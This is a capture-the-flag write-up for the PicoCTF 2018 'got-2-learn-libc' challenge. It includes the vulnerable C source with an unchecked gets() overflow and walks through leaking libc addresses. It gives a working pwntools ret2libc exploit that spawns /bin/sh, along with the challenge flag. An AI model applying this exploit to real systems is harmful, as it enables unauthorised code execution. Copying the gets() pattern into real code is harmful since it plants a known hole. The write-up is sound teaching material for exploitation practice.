# PicoCTF18 learn-libc

## Challenge

This [program](https://2018shell.picoctf.com/static/3f9baed3a53fe9962f7bd7b14b58d07e/vuln) gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833 on the shell server. [Source](https://2018shell.picoctf.com/static/3f9baed3a53fe9962f7bd7b14b58d07e/vuln.c). 

## Hints

try returning to systems calls to leak information

don't forget you can always return back to main()

## Solution

vuln.c:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */

void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Here are some useful addresses:\n");
  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);
  printf("\n");
  vuln();
  return 0;
}
```

Let's view the directory:

```bash
samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ls -al
total 72
drwxr-xr-x   2 root       root                4096 Mar 25  2019 .
drwxr-x--x 556 root       root               53248 Mar 25  2019 ..
-r--r-----   1 hacksports got-2-learn-libc_1    37 Mar 25  2019 flag.txt
-rwxr-sr-x   1 hacksports got-2-learn-libc_1  7856 Mar 25  2019 vuln
-rw-rw-r--   1 hacksports hacksports           843 Mar 25  2019 vuln.c
```

This question seems to be talking about using a `ret-2-libc` attack, but let's see if there's an easier way or if they intended it to be that way.

Let's use this script to determine what's available to us:

```python
#!/usr/bin/env python

from pwn import *

if len(sys.argv) < 2:
    elf = ELF('./vuln')
    sh = elf.process()
else:
    s = ssh(host='2018shell4.picoctf.com', user='samson', password=getpass())
    sh = s.process('vuln', cwd='/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833')
```

```bash
samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ python ~/lib.py
[*] '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln': pid 3914031
[*] Stopped process '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln' (pid 3914031)
```

Seems like the `NX` bit is set which means the stack is non-executable. We can't just insert shellcode and point `eip` to the start of our buffer.

So let's the binary and see how it works.

```bash
samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ ./vuln
Here are some useful addresses:

puts: 0xf75bd140
fflush 0xf75bb330
read: 0xf7632350
write: 0xf76323c0
useful_string: 0x56648030

Enter a string:
AAAAAAAAAAAAA
AAAAAAAAAAAAA
Thanks! Exiting now...
```

Let's try some inputs and verify it's susceptible to overflow: ``


I noticed that the addresses seem to change over time, take a look between these three runs

|  |Run 0|Run 1|Run 2|
|---|---|---|---|
|puts|0xf75bd140|0xf75bd140|0xf75bd140|
|fflush|0xf75bb330|0xf75bb330|0xf75bb330|
|read|0xf7632350|0xf765b350|0xf765b350|
|write|0xf765b3c0|0xf765b3c0|0xf765b3c0|
|useful_string|*0x56626030*|*0x56648030*|*0x565bf030*|

Note how the `useful_string` address changes all the time.

Since we have the address for other libc commands and they remain constant, we can also determine the address of the command `system()` and be sure it'll always stay at the address we find it.

```bash
samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ gdb vuln
< REDACTED >
(gdb) b main
Breakpoint 1 at 0x812
(gdb) r
Starting program: /problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln

Breakpoint 1, 0x5663e812 in main ()
(gdb) x puts
0xf759b140 <puts>:      0x57e58955
(gdb) x system
0xf7576940 <system>:    0x8b0cec83
```

We found `system()` at `0xf7576940`. So let's calculate the offset to `puts()` so we can be sure we're hitting system every time.

Great now from here, we just need to cause an overflow and set up the stack such that the processor will run whatever command we want with the proper arguments.

We need to make our stack look like this:

|  | Stack |
|---|---|
| Arguments to `system()` | `/bin/sh` |
| Caller function to return to | `AAAA` |
| Function Call | `system()` |
|  |  |

We can insert anything we want for the return address because once our exploit runs, we should have popped open a shell and the program will never need to return validly. Although, I believe the hint is trying to make it easy for us to debug by telling us to return to `main()`.

So let's figure out the buffer overflow. I'll spare the details for how many A's are needed.
But we need to be sure ESP points ot the top of the stack shown above.

```python
#!/usr/bin/env python

from pwn import *

if len(sys.argv) < 2:
    elf = ELF('/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln')
    sh = elf.process()
else:
    s = ssh(host='2018shell4.picoctf.com', user='samson', password="REDACTED")
    sh = s.process('vuln', cwd='/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833')

libc = ELF('/lib32/libc.so.6')
offset_system = libc.symbols['system']
offset_puts = libc.symbols['puts']
offset = offset_system - offset_puts

sh.recvuntil('puts: ')
addr_puts = int(sh.recv(10), 16)
sh.recvuntil('useful_string: ')
addr_shell = int(sh.recv(10), 16)
addr_system  = addr_puts + offset
#-----------------------------------------------
# A's + &system() + return address +&/bin/sh
#-----------------------------------------------
sleep(1)
payload = 'A'*160 + p32(addr_system)+ 'A'*4 + p32(addr_shell)
sh.sendline(payload)
sh.sendline('cat /problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/flag.txt')
sh.interactive()
```

```bash
samson@pico-2018-shell:/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833$ python ~/libw.py
[*] '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/problems/got-2-learn-libc_1_ceda86bc09ce7d6a0588da4f914eb833/vuln': pid 3917593
[*] '/lib32/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode


Enter a string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@9cAAAA0WV
Thanks! Exiting now...
picoCTF{syc4al1s_4rE_uS3fUl_a78c4d87}$
```

## Flag

`picoCTF{syc4al1s_4rE_uS3fUl_a78c4d87}`

## Notes

Untested

You can apparently find cycles like this:

```
#find buffer amount
'''
pwn cyclic 172 | strace ./vuln
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x62616170} ---
+++ killed by SIGSEGV +++
Segmentation fault
pwn cyclic -l 0x62616170
160
'''
```